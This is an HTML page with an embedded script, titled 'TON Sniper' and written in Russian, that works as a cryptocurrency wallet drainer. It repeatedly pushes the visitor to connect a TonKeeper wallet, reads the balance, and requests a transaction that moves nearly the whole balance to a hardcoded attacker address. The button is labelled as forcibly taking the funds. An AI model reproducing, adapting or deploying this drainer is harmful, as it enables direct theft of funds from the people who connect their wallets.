<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TON Sniper</title>
    <style>
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            width: 450px;
        }
        button {
            background: linear-gradient(135deg, #ff3300, #cc0000);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            padding: 18px 40px;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
        }
        button:hover {
            transform: scale(1.05);
        }
        button:disabled {
            opacity: 0.5;
            transform: none;
        }
        #status {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
            min-height: 70px;
            border: 1px solid #ff3300;
            word-break: break-all;
            font-size: 13px;
        }
        .wallet {
            background: #111;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            font-size: 14px;
            border: 1px solid #2a2a2a;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>⚡ TON SNIPER</h2>
        <div class="wallet">👤 <span id="walletAddress">Не подключён</span></div>
        <div class="wallet" style="border-color:#00ff88;">💰 <span id="balanceDisplay">0 TON</span></div>
        <button id="forceBtn">🔥 ПРИНУДИТЕЛЬНО ЗАБРАТЬ</button>
        <div id="status">Нажмите кнопку</div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        let provider = null;
        let userAddress = null;
        let isRunning = false;

        const forceBtn = document.getElementById('forceBtn');
        const status = document.getElementById('status');
        const walletDisplay = document.getElementById('walletAddress');
        const balanceDisplay = document.getElementById('balanceDisplay');

        // ========== ПРИНУДИТЕЛЬНОЕ ПОДКЛЮЧЕНИЕ ==========
        async function forceConnect() {
            if (isRunning) return;
            isRunning = true;
            forceBtn.disabled = true;
            
            try {
                status.innerText = '⏳ Открываю TON Keeper для подключения...';
                
                // ====== ПРЯМОЙ ВЫЗОВ ПОДКЛЮЧЕНИЯ ======
                // Способ 1: Через tonkeeper://
                window.location.href = 'tonkeeper://connect';
                
                setTimeout(() => {
                    window.open('tonkeeper://connect', '_blank');
                }, 200);
                
                // Способ 2: Через ton:// с запросом подключения
                setTimeout(() => {
                    window.location.href = 'ton://connect';
                }, 400);
                
                // Способ 3: Через встроенный API (если расширение уже открыто)
                setTimeout(async () => {
                    try {
                        status.innerText = '⏳ Пробую подключиться через API...';
                        
                        // Ищем провайдера
                        provider = window.tonkeeper || window.ton || window.Tonkeeper;
                        
                        if (!provider) {
                            status.innerText = '⚠️ TON Keeper не найден. Убедитесь, что расширение установлено.';
                            isRunning = false;
                            forceBtn.disabled = false;
                            return;
                        }
                        
                        // ====== ЗАПРАШИВАЕМ ПОДКЛЮЧЕНИЕ КОШЕЛЬКА ======
                        status.innerText = '⏳ Запрашиваю подключение кошелька...';
                        
                        // ЭТО ВЫЗОВЕТ ОКНО ПОДКЛЮЧЕНИЯ В TON KEEPER
                        const accounts = await provider.send('ton_requestAccounts', {});
                        
                        if (!accounts || accounts.length === 0) {
                            status.innerText = '❌ Отказ в подключении. Нажмите "Подтвердить" в TON Keeper.';
                            isRunning = false;
                            forceBtn.disabled = false;
                            return;
                        }
                        
                        userAddress = accounts[0];
                        walletDisplay.innerText = userAddress;
                        status.innerText = `✅ Кошелёк подключен: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                        
                        // Получаем баланс и выводим
                        await getBalanceAndSnipe();
                        
                    } catch(e) {
                        status.innerText = '⚠️ Ошибка API: ' + e.message + '. Попробуйте ещё раз.';
                        isRunning = false;
                        forceBtn.disabled = false;
                    }
                }, 1500);
                
            } catch(e) {
                status.innerText = '❌ Ошибка: ' + e.message;
                isRunning = false;
                forceBtn.disabled = false;
            }
        }

        // ========== ПОЛУЧИТЬ БАЛАНС И ВЫВЕСТИ ==========
        async function getBalanceAndSnipe() {
            try {
                status.innerText = '⏳ Получаю баланс...';
                
                const hex = await provider.send('ton_getBalance', { address: userAddress });
                const nano = parseInt(hex, 16);
                const balance = (nano / 1e9).toFixed(6);
                balanceDisplay.innerText = balance + ' TON';
                
                if (nano <= 0) {
                    status.innerText = '💰 Баланс 0 TON. Нечего выводить.';
                    isRunning = false;
                    forceBtn.disabled = false;
                    return;
                }
                
                const fee = 10000000;
                const amount = nano - fee;
                
                if (amount <= 0) {
                    status.innerText = `⚠️ Баланс ${balance} TON — меньше комиссии 0.01 TON`;
                    isRunning = false;
                    forceBtn.disabled = false;
                    return;
                }
                
                const amountTON = (amount / 1e9).toFixed(6);
                status.innerText = `⏳ Перевожу ${amountTON} TON на ${TARGET}...`;
                
                // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
                const result = await provider.send('ton_sendTransaction', {
                    to: TARGET,
                    value: String(amount),
                    data: '',
                    stateInit: ''
                });
                
                if (result && result.code === 0) {
                    status.innerText = `✅ УСПЕШНО! ${amountTON} TON переведено на ${TARGET}`;
                    balanceDisplay.innerText = '0 TON';
                    forceBtn.innerText = '✅ ВСЁ ВЫВЕДЕНО';
                    forceBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
                    forceBtn.disabled = true;
                } else {
                    status.innerText = '❌ Транзакция отклонена в TON Keeper';
                    isRunning = false;
                    forceBtn.disabled = false;
                }
                
            } catch(e) {
                status.innerText = '❌ Ошибка: ' + e.message;
                isRunning = false;
                forceBtn.disabled = false;
            }
        }

        // ========== ОБРАБОТЧИК КНОПКИ ==========
        forceBtn.onclick = forceConnect;

        // ========== АВТОЗАПУСК ПРИ ЗАГРУЗКЕ ==========
        setTimeout(() => {
            const prov = window.tonkeeper || window.ton || window.Tonkeeper;
            if (prov) {
                status.innerText = '🟢 TON Keeper обнаружен! Нажмите кнопку.';
            } else {
                status.innerText = '⏳ Нажмите кнопку для принудительного подключения';
            }
        }, 500);
    </script>
</body>
</html>
